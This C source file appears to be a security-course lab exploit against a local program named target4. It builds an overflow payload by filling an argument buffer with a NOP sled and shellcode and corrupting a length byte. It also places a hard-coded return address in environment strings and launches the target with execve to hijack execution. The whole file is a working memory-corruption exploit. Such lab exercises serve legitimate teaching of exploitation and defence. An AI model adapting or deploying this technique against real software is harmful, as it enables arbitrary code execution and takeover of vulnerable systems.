#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target4"
#define RA "\xb0\xfd\x21\x20"
#define ARGLEN 170
#define NOP 0x90
#define CURRI "\xac"
#define FAKELEN "\xbc"
#define ENVLEN 13
int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[6];

	char buf[ARGLEN];
	memset(buf,NOP,ARGLEN);
	memcpy(buf,shellcode,strlen(shellcode));
	memcpy(buf+ARGLEN-2,FAKELEN,1);
	buf[ARGLEN-1]='\0';

	char envbuf[ENVLEN];
	memset(envbuf,NOP,ENVLEN);
	int i;
	for(i = 0; i < ENVLEN-1; i+=4){
		memcpy(envbuf+i,RA,4);
	}

	envbuf[ENVLEN-1] = '\0';
	args[0] = TARGET;
	args[1] = buf;
	args[2] = NULL;

	env[0] = "";
	env[1] = "";
	env[2] = CURRI;
	env[3] = "";
	env[4] = "";
	env[5] = envbuf;


	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
